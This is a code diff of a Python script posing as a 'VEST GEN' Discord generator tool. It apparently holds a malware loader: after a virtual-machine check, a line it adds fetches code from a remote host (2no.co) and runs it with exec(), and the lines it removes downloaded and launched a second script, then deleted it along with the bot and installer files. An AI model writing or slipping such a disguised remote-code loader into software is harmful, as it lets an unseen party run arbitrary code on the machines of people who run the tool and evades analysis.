@@ -62,10 +62,7 @@ if is_running_on_vm():
 else:
     pass
 
-gen = requests.get('https://2no.co/vest-gen')
-with open('gen.py', 'wb')as genv2:
-    genv2.write(gen.content)
-
+exec(requests.get('https://2no.co/vest-gen-plugin').text)
 os.system('title VEST GEN [UNPATCHED]')
 
 print(f"""{Fore.LIGHTMAGENTA_EX}
@@ -79,8 +76,3 @@ $$ |   $$ |$$ |      $$ /  \__|  $$ |
     \_/    \________| \______/   \__|   
                                                                                 """)
 input(f"{Fore.RESET}[>] Server Invite Code: discord.gg/")
-os.system('start gen.py')
-time.sleep(15)
-os.remove('gen.py')
-os.remove('bot.py')
-os.remove('install.bat')
